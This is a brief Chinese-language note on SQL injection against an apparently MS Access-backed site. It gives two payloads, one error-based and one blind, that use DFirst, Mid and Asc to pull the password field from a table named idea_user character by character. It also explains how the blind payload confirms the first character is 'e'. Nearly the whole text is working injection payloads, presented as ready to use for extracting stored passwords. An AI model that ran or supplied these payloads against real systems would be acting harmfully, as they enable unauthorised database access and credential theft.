需要报错

select * from idea_user where id=3+(dfirst([password],([idea_user]![password])))


盲注

select * from idea_user where id=3+asc(mid((dfirst("[password]","[idea_user]")),1,1))-101

password字段第一个字符为e，对应ascii为101，所以id=3+101-101 还是等于3，页面返回正常
